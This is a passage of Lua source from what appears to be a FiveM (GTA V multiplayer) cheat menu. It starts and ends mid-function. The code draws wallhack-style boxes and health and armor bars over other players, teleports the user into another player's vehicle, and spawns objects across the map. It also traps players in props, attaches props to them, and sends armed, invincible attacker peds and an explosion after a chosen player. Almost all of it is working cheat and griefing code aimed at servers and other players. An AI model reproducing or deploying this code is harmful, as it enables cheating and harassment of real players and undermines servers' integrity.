                   sum.f.DrawRect(0, -(screenY - screenY2) / 2, (screenY - screenY2) / 3.48, 1 / resY, r, g, b, 255)
               end
           else
               local r, g, b = sum.s['visuals-bounding-r'].value, sum.s['visuals-bounding-g'].value, sum.s['visuals-bounding-b'].value
               sum.f.DrawRect((screenY - screenY2) / 7, 0, 1 / resX, screenY - screenY2, r, g, b, 255)
               sum.f.DrawRect(-(screenY - screenY2) / 7, 0, 1 / resX, screenY - screenY2, r, g, b, 255)
               sum.f.DrawRect(0, (screenY - screenY2) / 2, (screenY - screenY2) / 3.48, 1 / resY, r, g, b, 255)
               sum.f.DrawRect(0, -(screenY - screenY2) / 2, (screenY - screenY2) / 3.48, 1 / resY, r, g, b, 255)
           end
               if sum.c['visuals-fillbounding-box'] then 
                   sum.f.DrawRect(0, 0, (screenY - screenY2) / 3.5, screenY - screenY2, 1, 1, 1, sum.s['visuals-bounding-alpha'].value)
               end
           end
       end
   end
   
   
   
   function sum.f.healthbar(ped)
       local coordXMin = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, 0.9)
       local coordYPlus = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, -0.9)
       local bool, screenX, screenY = sum.f.GetScreenCoordFromWorldCoord(coordXMin.x, coordXMin.y, coordXMin.z)
       local bool2, screenX2, screenY2 = sum.f.GetScreenCoordFromWorldCoord(coordYPlus.x, coordYPlus.y, coordYPlus.z)
       local resX, resY = sum.f.GetActiveScreenResolution()
       local coord = sum.f.GetEntityCoords(ped)
       local x, y, z = coord.x, coord.y, coord.z
       local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false) 
       local NUM = (sum.f.GetEntityMaxHealth(ped)-100) / (screenY - screenY2)
   
       if d < sum.s['visuals-distance'].value then
       if bool and bool2 and not sum.f.IsEntityDead(ped) and sum.f.IsEntityOnScreen(ped) then
           local H = sum.f.GetEntityHealth(ped)-100
           if H > (sum.f.GetEntityMaxHealth(ped)-100) then 
               H = (sum.f.GetEntityMaxHealth(ped)-100) 
           end
           sum.f.DrawRect((0 + (screenY - screenY2) / 7 - 4 / resX), 0 - (screenY - screenY2)/2 + ((H/NUM) - (1 / resX))/2, 1 / resX, -1*(H/NUM)-(1 / resX), r, g, b, 255)
   
           if sum.c['visuals-health-bar'] then 
               r, g, b = sum.s['visuals-health-r'].value, sum.s['visuals-health-g'].value, sum.s['visuals-health-b'].value
           else
               r, g, b = sum.curak.floor(100-H), sum.curak.floor(H * 2), 0
           end
   
           if sum.c['visuals-healthbar-outline'] then 
               sum.f.DrawRect((0 + (screenY - screenY2) / 7 - 4 / resX), 0, 3 / resX, (screenY - screenY2)+(2 / resX), 25, 25, 25, 255)
               sum.f.DrawRect((0 + (screenY - screenY2) / 7 - 4 / resX), 0, 1 / resX, (screenY - screenY2), 25, 25, 25, 255)
           end
               sum.f.DrawRect((0 + (screenY - screenY2) / 7 - 4 / resX), 0 - (screenY - screenY2)/2 + ((H/NUM) - (1 / resX))/2, 1 / resX, -1*(H/NUM)-(1 / resX), r, g, b, 255)
           if sum.c['visuals-healthbar-text'] then 
                   sum.f.drawTextOutline(sum.curak.floor(H), (0 + (screenY - screenY2) / 7 - 4 / resX)-0.003,  (0 - (screenY - screenY2)/2 + ((H/NUM) - (1 / resX))-0.003)+0.011, 0.2, 4, true, 255, 255, 255, 255)
               end
           end
       end   
   end
   function sum.f.armorbar(ped)
       local coordXMin = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, 0.9)
       local coordYPlus = sum.f.GetOffsetFromEntityInWorldCoords(ped, 0, 0, -0.9)
       local bool, screenX, screenY = sum.f.GetScreenCoordFromWorldCoord(coordXMin.x, coordXMin.y, coordXMin.z)
       local bool2, screenX2, screenY2 = sum.f.GetScreenCoordFromWorldCoord(coordYPlus.x, coordYPlus.y, coordYPlus.z)
       local resX, resY = sum.f.GetActiveScreenResolution()
       local coord = sum.f.GetEntityCoords(ped)
       local x, y, z = coord.x, coord.y, coord.z
       local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityCoords(ped), false) 
       if d < sum.s['visuals-distance'].value then
           if bool and bool2 and not sum.f.IsEntityDead(ped) and sum.f.IsEntityOnScreen(ped) then
               local r, g, b = sum.s['visuals-armor-r'].value, sum.s['visuals-armor-g'].value, sum.s['visuals-armor-b'].value
               local ay = 1200
               local A = sum.f.GetPedArmour(ped)
               local NUM = 100/((screenY - screenY2)/3.5)
               sum.f.DrawRect(0, (0 + -(screenY - screenY2) / 2 + 8 / resX), ((screenY - screenY2) / 3.5) + (2 / resX), 3 / resY, 1, 1, 1, 255)
               sum.f.DrawRect(0, (0 + -(screenY - screenY2) / 2 + 8 / resX), (screenY - screenY2) / 3.5, 1 / resY, 1, 1, 1, 255)
               sum.f.DrawRect(0 + (screenY - screenY2)/7 - ((A/NUM) - (1 / resX))/2, (0 + -(screenY - screenY2) / 2 + 8 / resX), (-1*(A/NUM))-(1 / resX) , 1 / resY, r, g, b, 255)
               if sum.c['visuals-armorbar-text'] then 
                   sum.f.drawTextOutline(sum.curak.floor(A), 0 + (screenY - screenY2)/7 - ((A/NUM) - (1 / resX)),  (0 + -(screenY - screenY2) / 2 + 8 / resX)-0.007+0.011, 0.2, 4, true, 255, 255, 255, 255)
               end
           end
       end
   end
   
   sum.m.GetResources = function()
       local resources = {}
       for i = 0, sum.f.GetNumResources() do
           resources[i] = sum.f.GetResourceByFindIndex(i)
       end
       return resources
   end
   
   sum.m.GetResourceStatus = function(resource_name)
       if sum.f.GetResourceState(resource_name) == "started" or sum.curak.upper(sum.f.GetResourceState(resource_name)) == "started" or sum.curak.lower(sum.f.GetResourceState(resource_name)) == "started" then
           return true
       else
           return false
       end
   end
   
   function sum.f.OptimezeFPS()
       for ped in sum.f.enumeratePeds() do
           sum.f.LeaderboardsClearCacheData()
           sum.f.LeaderboardsReadClearAll()
           sum.f.ClearAllBrokenGlass()
           sum.f.ClearAllHelpMessages()
           sum.f.ClearBrief()
           sum.f.ClearGpsFlags()
           sum.f.ClearPrints()
           sum.f.ClearSmallPrints()
           sum.f.ClearReplayStats()
           sum.f.ClearFocus()
           sum.f.ClearHdArea()      
           sum.f.ClearRelationshipBetweenGroups(255, l_1017, 0xA49E591C)
           sum.f.ClearRagdollBlockingFlags(ped, 1)
           sum.f.ClearFacialClipsetOverride(ped)
           sum.f.ClearFacialIdleAnimOverride(ped)
           sum.f.ResetPedVisibleDamage(ped)
           sum.f.ClearPedBloodDamage(ped)
           sum.f.ClearPedWetness(ped)
           sum.f.ClearPedEnvDirt(ped)
           sum.f.ClearAllPedVehicleForcedSeatUsage(ped)
           sum.f.ClearPedDriveByClipsetOverride(ped)
           sum.f.ClearAllPedProps(ped)
           sum.f.ClearPedAlternateWalkAnim(ped)
           sum.f.ClearPedDecorations(ped)
       end
       sum.f.deleteall()
   end
   
   function sum.f.fuckupmap(fuckmap)
       sum.f.CreateObject(fuckmap, 431.05, -983.04, 30.71, true, true, false)
       sum.f.CreateObject(fuckmap, 226.12, -793.08, 30.67, true, true, false)
       sum.f.CreateObject(fuckmap, 284.67, -863.06, 10.70, true, true, false)
       sum.f.CreateObject(fuckmap, 106.12, -1005.57, 10.70, true, true, false)
       sum.f.CreateObject(fuckmap, -742.62, -670.57, 20.70, true, true, false)
       sum.f.CreateObject(fuckmap, -83.91, -120.57, 30.70, true, true, false)
       sum.f.CreateObject(fuckmap, -1026.01, -489.57, 50.70, true, true, false)
       sum.f.CreateObject(fuckmap, -1378.01, -396.57, 32.70, true, true, false)
       sum.f.CreateObject(fuckmap, -833.01, -1277.57, 4.70, true, true, false)
       sum.f.CreateObject(fuckmap, -398.01, -2165.89, 5.70, true, true, false)
       sum.f.CreateObject(fuckmap, -500.01, -2060.89, 20.70, true, true, false)
       sum.f.CreateObject(fuckmap, 1013.906, 469.653, 0, true, true, false)
       sum.f.CreateObject(fuckmap, -157.854, 906.653, 5.70, true, true, false)
       sum.f.CreateObject(fuckmap, -2088.525, 633.528, 20.70, true, true, false)
       sum.f.CreateObject(fuckmap, -2112.81, 2976.336, 4.70, true, true, false)
       sum.f.CreateObject(fuckmap, 1129.261, 3012.753, 5.70, true, true, false)
       sum.f.CreateObject(fuckmap, -2149.238, 4797.172, 20.70, true, true, false)
       sum.f.CreateObject(fuckmap, -2149.238, 4797.172, 20.70, true, true, false)
       sum.f.CreateObject(fuckmap, -84.998, 6217.423, 20.70, true, true, false)
   end
   
   function sum.f.teltoplayveh(player)
       local ped = sum.f.GetPlayerPed(player)
       local vehicle = sum.f.GetVehiclePedIsUsing(sum.f.GetPlayerPed(player))
       local getseats = sum.f.GetVehicleMaxNumberOfPassengers(vehicle)
       local vehnamenotif = sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId())))
   
       if not sum.f.IsPedInAnyVehicle(ped) then
           return sum.f.sendNotification('Player '..sum.f.GetPlayerName(sel.selectedPlayer)..' is not in vehicle', 'Online')
       end
   
       for i = 0, getseats do
           if sum.f.IsVehicleSeatFree(vehicle, i) then
               sum.f.SetPedIntoVehicle(sum.f.PlayerPedId(), vehicle, i)
               break
           end
       end
       sum.f.sendNotification('Teleported To '..sum.f.GetPlayerName(sel.selectedPlayer)..'Â´s vehicle: '..vehnamenotif, 'Online')
   end
   
   
   function sum.f.maxout(veh)
       local p = sum.f.PlayerPedId()
       local veh = sum.f.GetVehiclePedIsIn(p, false) 
       sum.f.SetVehicleModKit(veh, 0)
       sum.f.SetVehicleWheelType(veh, 7)
       sum.f.SetVehicleMod(veh, 0, sum.f.GetNumVehicleMods(veh, 0) - 1, false)
       sum.f.SetVehicleMod(veh, 1, sum.f.GetNumVehicleMods(veh, 1) - 1, false)
       sum.f.SetVehicleMod(veh, 2, sum.f.GetNumVehicleMods(veh, 2) - 1, false)
       sum.f.SetVehicleMod(veh, 3, sum.f.GetNumVehicleMods(veh, 3) - 1, false)
       sum.f.SetVehicleMod(veh, 4, sum.f.GetNumVehicleMods(veh, 4) - 1, false)
       sum.f.SetVehicleMod(veh, 5, sum.f.GetNumVehicleMods(veh, 5) - 1, false)
       sum.f.SetVehicleMod(veh, 6, sum.f.GetNumVehicleMods(veh, 6) - 1, false)
       sum.f.SetVehicleMod(veh, 7, sum.f.GetNumVehicleMods(veh, 7) - 1, false)
       sum.f.SetVehicleMod(veh, 8, sum.f.GetNumVehicleMods(veh, 8) - 1, false)
       sum.f.SetVehicleMod(veh, 9, sum.f.GetNumVehicleMods(veh, 9) - 1, false)
       sum.f.SetVehicleMod(veh, 10, sum.f.GetNumVehicleMods(veh, 10) - 1, false)
       sum.f.SetVehicleMod(veh, 11, sum.f.GetNumVehicleMods(veh, 11) - 1, false)
       sum.f.SetVehicleMod(veh, 12, sum.f.GetNumVehicleMods(veh, 12) - 1, false)
       sum.f.SetVehicleMod(veh, 13, sum.f.GetNumVehicleMods(veh, 13) - 1, false)
       sum.f.SetVehicleMod(veh, 15, sum.f.GetNumVehicleMods(veh, 15) - 2, false)
       sum.f.SetVehicleMod(veh, 16, sum.f.GetNumVehicleMods(veh, 16) - 1, false)
       sum.f.ToggleVehicleMod(veh, 17, true)
       sum.f.ToggleVehicleMod(veh, 18, true)
       sum.f.ToggleVehicleMod(veh, 19, true)
       sum.f.ToggleVehicleMod(veh, 20, true)
       sum.f.ToggleVehicleMod(veh, 21, true)
       sum.f.ToggleVehicleMod(veh, 22, true)
       sum.f.SetVehicleXenonLightsColor(veh, 7)
       --sum.f.SetVehicleMod(veh, 23, 1, false)
       --sum.f.SetVehicleMod(veh, 24, 1, false)
       sum.f.SetVehicleMod(veh, 25, sum.f.GetNumVehicleMods(veh, 25) - 1, false)
       sum.f.SetVehicleMod(veh, 27, sum.f.GetNumVehicleMods(veh, 27) - 1, false)
       sum.f.SetVehicleMod(veh, 28, sum.f.GetNumVehicleMods(veh, 28) - 1, false)
       sum.f.SetVehicleMod(veh, 30, sum.f.GetNumVehicleMods(veh, 30) - 1, false)
       sum.f.SetVehicleMod(veh, 33, sum.f.GetNumVehicleMods(veh, 33) - 1, false)
       sum.f.SetVehicleMod(veh, 34, sum.f.GetNumVehicleMods(veh, 34) - 1, false)
       sum.f.SetVehicleMod(veh, 35, sum.f.GetNumVehicleMods(veh, 35) - 1, false)
       --sum.f.SetVehicleMod(veh, 38, sum.f.GetNumVehicleMods(veh, 38) - 1, true)
       sum.f.SetVehicleWindowTint(veh, 1)
       sum.f.SetVehicleTyresCanBurst(veh, false)
       sum.f.SetVehicleCustomPrimaryColour(veh, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
       sum.f.SetVehicleCustomSecondaryColour(veh, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
       sum.f.SetNeonsOnVeh()
       sum.f.SetVehicleNeonLightsColour(veh, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
   end
   
   function sum.f.maxperformance(veh)
       local p = sum.f.PlayerPedId()
       local veh = sum.f.GetVehiclePedIsIn(p, false) 
       sum.f.requestControlOnce(veh)
       sum.f.NetworkRequestControlOfEntity(p)
       sum.f.SetVehicleModKit(veh, 0.0)
       sum.f.SetVehicleMod(veh, 11, sum.f.GetNumVehicleMods(veh, 11) - 1, false)
       sum.f.SetVehicleMod(veh, 12, sum.f.GetNumVehicleMods(veh, 12) - 1, false)
       sum.f.SetVehicleMod(veh, 13, sum.f.GetNumVehicleMods(veh, 13) - 1, false)
       sum.f.SetVehicleMod(veh, 15, sum.f.GetNumVehicleMods(veh, 15) - 2, false)
       sum.f.SetVehicleMod(veh, 16, sum.f.GetNumVehicleMods(veh, 16) - 1, false)
       sum.f.ToggleVehicleMod(veh, 17, true)
       sum.f.ToggleVehicleMod(veh, 18, true)
       sum.f.ToggleVehicleMod(veh, 19, true)
       sum.f.ToggleVehicleMod(veh, 21, true)
   end
   
   
   function sum.f.npcplate()
       for p in sum.f.enumeratePeds() do
           if not sum.f.IsPedAPlayer(p) and p ~= sum.f.PlayerPedId() then
           local veh = sum.f.GetVehiclePedIsIn(p, false) 
           sum.f.requestControlOnce(veh)
           sum.f.NetworkRequestControlOfEntity(p)
           sum.f.SetVehicleNumberPlateText(veh, "FIVESENS")
       end
   end
   end
   
   function sum.f.maxoutnpc()
       for p in sum.f.enumeratePeds() do
           if not sum.f.IsPedAPlayer(p) and p ~= sum.f.PlayerPedId() then
               local veh = sum.f.GetVehiclePedIsIn(p, false) 
               sum.f.SetVehicleModKit(veh, 0)
               sum.f.SetVehicleWheelType(veh, 7)
               sum.f.SetVehicleMod(veh, 0, sum.f.GetNumVehicleMods(veh, 0) - 1, false)
               sum.f.SetVehicleMod(veh, 1, sum.f.GetNumVehicleMods(veh, 1) - 1, false)
               sum.f.SetVehicleMod(veh, 2, sum.f.GetNumVehicleMods(veh, 2) - 1, false)
               sum.f.SetVehicleMod(veh, 3, sum.f.GetNumVehicleMods(veh, 3) - 1, false)
               sum.f.SetVehicleMod(veh, 4, sum.f.GetNumVehicleMods(veh, 4) - 1, false)
               sum.f.SetVehicleMod(veh, 5, sum.f.GetNumVehicleMods(veh, 5) - 1, false)
               sum.f.SetVehicleMod(veh, 6, sum.f.GetNumVehicleMods(veh, 6) - 1, false)
               sum.f.SetVehicleMod(veh, 7, sum.f.GetNumVehicleMods(veh, 7) - 1, false)
               sum.f.SetVehicleMod(veh, 8, sum.f.GetNumVehicleMods(veh, 8) - 1, false)
               sum.f.SetVehicleMod(veh, 9, sum.f.GetNumVehicleMods(veh, 9) - 1, false)
               sum.f.SetVehicleMod(veh, 10, sum.f.GetNumVehicleMods(veh, 10) - 1, false)
               sum.f.SetVehicleMod(veh, 11, sum.f.GetNumVehicleMods(veh, 11) - 1, false)
               sum.f.SetVehicleMod(veh, 12, sum.f.GetNumVehicleMods(veh, 12) - 1, false)
               sum.f.SetVehicleMod(veh, 13, sum.f.GetNumVehicleMods(veh, 13) - 1, false)
               sum.f.SetVehicleMod(veh, 15, sum.f.GetNumVehicleMods(veh, 15) - 2, false)
               sum.f.SetVehicleMod(veh, 16, sum.f.GetNumVehicleMods(veh, 16) - 1, false)
               sum.f.ToggleVehicleMod(veh, 17, true)
               sum.f.ToggleVehicleMod(veh, 18, true)
               sum.f.ToggleVehicleMod(veh, 19, true)
               sum.f.ToggleVehicleMod(veh, 20, true)
               sum.f.ToggleVehicleMod(veh, 21, true)
               sum.f.ToggleVehicleMod(veh, 22, true)
               sum.f.SetVehicleMod(veh, 23, 1, false)
               sum.f.SetVehicleMod(veh, 24, 1, false)
               sum.f.SetVehicleMod(veh, 25, sum.f.GetNumVehicleMods(veh, 25) - 1, false)
               sum.f.SetVehicleMod(veh, 27, sum.f.GetNumVehicleMods(veh, 27) - 1, false)
               sum.f.SetVehicleMod(veh, 28, sum.f.GetNumVehicleMods(veh, 28) - 1, false)
               sum.f.SetVehicleMod(veh, 30, sum.f.GetNumVehicleMods(veh, 30) - 1, false)
               sum.f.SetVehicleMod(veh, 33, sum.f.GetNumVehicleMods(veh, 33) - 1, false)
               sum.f.SetVehicleMod(veh, 34, sum.f.GetNumVehicleMods(veh, 34) - 1, false)
               sum.f.SetVehicleMod(veh, 35, sum.f.GetNumVehicleMods(veh, 35) - 1, false)
               sum.f.SetVehicleMod(veh, 38, sum.f.GetNumVehicleMods(veh, 38) - 1, true)
               sum.f.SetVehicleWindowTint(veh, 1)
               sum.f.SetVehicleTyresCanBurst(veh, false)
               sum.f.SetVehicleNeonLightEnabled(veh, 0, true)
               sum.f.SetVehicleNeonLightEnabled(veh, 1, true)
               sum.f.SetVehicleNeonLightEnabled(veh, 2, true)
               sum.f.SetVehicleNeonLightEnabled(veh, 3, true)
               sum.f.SetVehicleNeonLightsColour(veh, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
               sum.f.SetVehicleCustomPrimaryColour(veh, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
               sum.f.SetVehicleCustomSecondaryColour(veh, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
               sum.f.ToggleVehicleMod(veh, 22, true)
               sum.f.SetVehicleXenonLightsColor(veh, 8)
           end
       end
   end
   
       function sum.f.colorcarnpc()
           for p in sum.f.enumeratePeds() do
           if not sum.f.IsPedAPlayer(p) and p ~= sum.f.PlayerPedId() then
           local veh = sum.f.GetVehiclePedIsIn(p, false) 
           sum.f.requestControlOnce(veh)
           sum.f.NetworkRequestControlOfEntity(p)
           sum.f.SetVehicleCustomPrimaryColour(veh, sum.s['npcvehicle-color-r'].value, sum.s['npcvehicle-color-g'].value, sum.s['npcvehicle-color-b'].value)
           sum.f.SetVehicleCustomSecondaryColour(veh, sum.s['npcvehicle-color-r'].value, sum.s['npcvehicle-color-g'].value, sum.s['npcvehicle-color-b'].value)    
       end
   end
   end
   
   
           function sum.f.maxperfonpc()
               for p in sum.f.enumeratePeds() do
               if not sum.f.IsPedAPlayer(p) and p ~= sum.f.PlayerPedId() then
               local veh = sum.f.GetVehiclePedIsIn(p, false) 
               sum.f.requestControlOnce(veh)
               sum.f.NetworkRequestControlOfEntity(p)
               sum.f.SetVehicleModKit(veh, 0.0)
               sum.f.SetVehicleMod(veh, 11, sum.f.GetNumVehicleMods(veh, 11) - 1, false)
               sum.f.SetVehicleMod(veh, 12, sum.f.GetNumVehicleMods(veh, 12) - 1, false)
               sum.f.SetVehicleMod(veh, 13, sum.f.GetNumVehicleMods(veh, 13) - 1, false)
               sum.f.SetVehicleMod(veh, 15, sum.f.GetNumVehicleMods(veh, 15) - 2, false)
               sum.f.SetVehicleMod(veh, 16, sum.f.GetNumVehicleMods(veh, 16) - 1, false)
               sum.f.ToggleVehicleMod(veh, 17, true)
               sum.f.ToggleVehicleMod(veh, 18, true)
               sum.f.ToggleVehicleMod(veh, 19, true)
               sum.f.ToggleVehicleMod(veh, 21, true)
           end
       end
   end
   
   
   function sum.f.spawnvehicle(vehicle)
       local hash = sum.f.GetHashKey(vehicle)
       local x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId()))
       if sum.f.IsModelValid(hash) then
           if not sum.f.HasModelLoaded(hash) then 
               sum.f.RequestModel(hash)
           end
           local veh = sum.f.CreateVehicle(hash, x, y, z, 1, 1, 1)
           if sum.c['vehicle-changecolor'] then 
               sum.f.SetVehicleCustomPrimaryColour(veh, sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value)
               sum.f.SetVehicleCustomSecondaryColour(veh, sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value)
           end
           if sum.c['vehicle-maxout'] then 
               sum.f.maxout(veh)
           end
           if sum.c['vehicle-enterveh'] then 
               local ped = sum.f.PlayerPedId()
               sum.f.SetPedIntoVehicle(ped, veh, -1)
           end
       else
       end
   end
   
       function sum.f.TrapPlayers()
           for k, v in pairs(sum.f.GetActivePlayers()) do
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
               local prop = sum.f.GetHashKey("bkr_prop_bkr_cashpile_07")
   
               for v = 1, 5 do
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z -0.5, true, true, true)
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z +1, true, true, true)
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z -0.5, true, true, true)
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z +1, true, true, true)
               sum.f.CreateObject(prop, coord.x +0.5, coord.y +0.5, coord.z +0.5, true, true, true)
               sum.f.CreateObject(prop, coord.x -0.5, coord.y -0.5, coord.z +0.5, true, true, true)
               sum.f.SetEntityAlpha(prop, 0, false)
               sum.f.SetEntityAlpha(prop, 0, false)
           end
       end
   end
   
       function sum.f.TrapPlayer()
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
               local prop = sum.f.GetHashKey("bkr_prop_bkr_cashpile_07")
   
               for v = 1, 5 do
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z -0.5, true, true, true)
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z +1, true, true, true)
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z -0.5, true, true, true)
               sum.f.CreateObject(prop, coord.x, coord.y, coord.z +1, true, true, true)
               sum.f.CreateObject(prop, coord.x +0.5, coord.y +0.5, coord.z +0.5, true, true, true)
               sum.f.CreateObject(prop, coord.x -0.5, coord.y -0.5, coord.z +0.5, true, true, true)
               sum.f.SetEntityAlpha(prop, 0, false)
               sum.f.SetEntityAlpha(prop, 0, false)
           end
       end
   
       function sum.f.DestroyPlayers()
           for k, v in pairs(sum.f.GetActivePlayers()) do
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
               local objectshits = {"apa_mp_h_yacht_bed_01","bkr_prop_biker_bblock_hump_01","bkr_prop_printmachine_4rollerp_st","csx_coastbigroc03_","ce_xr_ctr2","csx_coastrok3_","ex_prop_crate_elec_sc","ex_prop_crate_clothing_sc","gr_prop_gr_basepart","gr_prop_gr_cnc_01a","gr_prop_gr_ramproof_gate","gr_prop_gr_target_small_04a","gr_prop_gr_target_small_01b","gr_prop_inttruck_carmod_01","hei_prop_carrier_jet","imp_prop_covered_vehicle_07a","imp_prop_flatbed_ramp","lf_house_09_","lf_house_08_","lf_house_05_","lf_house_10_","lf_house_11_","prop_haybailer_01","prop_phonebox_04","dt1_23_dt1_scaffold","prop_parking_hut_2","prop_dumpster_01a","prop_rub_carwreck_7","apa_mp_h_stn_chairarm_02","apa_mp_h_stn_chairarm_03","apa_mp_h_kit_kitchen_01_a","apa_mp_h_str_avunitm_01","apa_prop_flag_czechrep","bkr_prop_bkr_cashpile_07","bkr_prop_meth_chiller_01a","bkr_prop_prtmachine_dryer_spin",}
               local SpawnProp = (objectshits[math.random(#objectshits)])
               for v = 1, 5 do
               local SpawnPropd = sum.f.CreateObject(sum.f.GetHashKey(SpawnProp), coord, true, true, true)
               sum.f.AttachEntityToEntity(SpawnPropd,v,sum.f.GetPedBoneIndex(v, 0),coord,true,true,false,true,1,true)
           end
       end
   end
   
       function sum.f.CarInMaze(shitprop)
           for veh in sum.f.enumerateVehicles() do
           local prop = sum.f.GetHashKey(shitprop)
           local maze = sum.f.CreateObject(prop, 0, 0, 0, true, true, true)
           sum.f.NetworkRequestControlOfEntity(veh)
           sum.f.requestControlOnce(veh)
           sum.f.requestControlOnce(maze)
           sum.f.AttachEntityToEntity(maze, veh, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
   
       end
   end
   
       function sum.f.PropsInToSHIT(shitprop)
           for obj in sum.f.enumerateObjects() do
           local prop = sum.f.GetHashKey(shitprop)
           local maze = sum.f.CreateObject(prop, 0, 0, 0, true, true, true)
           sum.f.NetworkRequestControlOfEntity(obj)
           sum.f.requestControlOnce(obj)
           sum.f.requestControlOnce(maze)
           sum.f.AttachEntityToEntity(maze, obj, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
       end
   end
   
       function sum.f.PlayerToSilo(shitprop)
           for ped in sum.f.enumeratePeds() do
           local prop = sum.f.GetHashKey(shitprop)
           local wash = sum.f.CreateObject(prop, 0, 0, 0, true, true, true)
           sum.f.AttachEntityToEntity(wash, ped, 0, 0, 0.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
       end
   end
   
       function sum.f.Playrstoprop(shitprop)
           local ped = sum.f.GetPlayerPed(sel.selectedPlayer)
           local prop = sum.f.GetHashKey(shitprop)
           local wash = sum.f.CreateObject(prop, 0, 0, 0, true, true, true)
           sum.f.AttachEntityToEntity(wash, ped, 0, 0, 0.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
       end
   
       function sum.f.terroristattack()
           if not sum.f.HasModelLoaded(sum.f.GetHashKey('mp_m_freemode_01')) then
               sum.f.RequestModel(sum.f.GetHashKey('mp_m_freemode_01'))
           end
           -- CREATE PED
           local ped = sum.f.CreatePed(5, sum.f.GetHashKey('mp_m_freemode_01'), sum.f.GetOffsetFromEntityInWorldCoords(sum.f.GetPlayerPed(sel.selectedPlayer), 0.0, -1.0, -1.0), sum.f.GetEntityHeading(sum.f.GetPlayerPed(sel.selectedPlayer)), true, true)
           -- CLOTHES
           sum.f.SetPedDefaultComponentVariation(ped)
           sum.f.SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
           sum.f.SetPedComponentVariation(ped, 1, 115, 0, 2)
           sum.f.SetPedComponentVariation(ped, 3, 4, 0, 2)
           sum.f.SetPedComponentVariation(ped, 11, 12, 0, 2)
           sum.f.SetPedComponentVariation(ped, 8, 15, 0, 2)
           sum.f.SetPedComponentVariation(ped, 4, 56, 0, 2)
           sum.f.SetPedComponentVariation(ped, 6, 34, 0, 2)
           sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
           sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_ASSAULTRIFLE"), 200, 1, 1)
   
           -- EXPLOSION
           sum.curak.thr(function()
               sum.curak.wait(2500)
               sum.f.AddExplosion(sum.f.GetEntityCoords(ped), 7, 500.0, true, false, false, false)
           end)
       end
   
       
       function sum.f.gangsterattack()
           local pullp = {"csb_ramp_gang","g_m_importexport_01","g_m_y_famca_01",}
           local guns = {"WEAPON_MICROSMG", "WEAPON_HEAVYSNIPER", "WEAPON_RPG", "WEAPON_ASSAULTRIFLE", "WEAPON_MINIGUN"}
           local gangnguns = (guns[math.random(#guns)])
           local gangn = (pullp[math.random(#pullp)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(gangn)) then 
               sum.f.RequestModel(sum.f.GetHashKey(gangn))
           end 
   
           local spawngang = sum.f.CreatePed(3, sum.f.GetHashKey(gangn), sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)), 1, 1, 1)
           sum.f.SetEntityInvincible(spawngang, true)
           sum.f.GiveWeaponToPed(spawngang, sum.f.GetHashKey(gangnguns), 200, 1, 1)
           sum.f.TaskCombatPed(spawngang, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
       end
   
       
       function sum.f.monkeyattack()
           local ped = sum.f.GetPlayerPed(sel.selectedPlayer)
           local pullp = {"a_c_chimp"}
           local guns = {"WEAPON_MICROSMG", "WEAPON_HEAVYSNIPER", "WEAPON_RPG", "WEAPON_ASSAULTRIFLE", "WEAPON_MINIGUN"}
           local gangnguns = (guns[math.random(#guns)])
           local gangn = (pullp[math.random(#pullp)])
           if not sum.f.HasModelLoaded(sum.f.GetHashKey(gangn)) then 
               sum.f.RequestModel(sum.f.GetHashKey(gangn))
           end 
           local spawngang = sum.f.CreatePed(0, sum.f.GetHashKey(gangn), sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)), 1, 1, 1)
           sum.f.SetEntityInvincible(spawngang, true)
           sum.f.GiveWeaponToPed(spawngang, sum.f.GetHashKey(gangnguns), 200, 1, 1)
           sum.f.TaskCombatPed(spawngang, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
       end
   
       
       function sum.f.dogattack()
           local ped = sum.f.GetPlayerPed(sel.selectedPlayer)
           local pullp = {"a_c_chop","a_c_poodle","a_c_pug",}
           local guns = {"WEAPON_MICROSMG", "WEAPON_HEAVYSNIPER", "WEAPON_RPG", "WEAPON_ASSAULTRIFLE", "WEAPON_MINIGUN"}
           local gangnguns = (guns[math.random(#guns)])
           local gangn = (pullp[math.random(#pullp)])
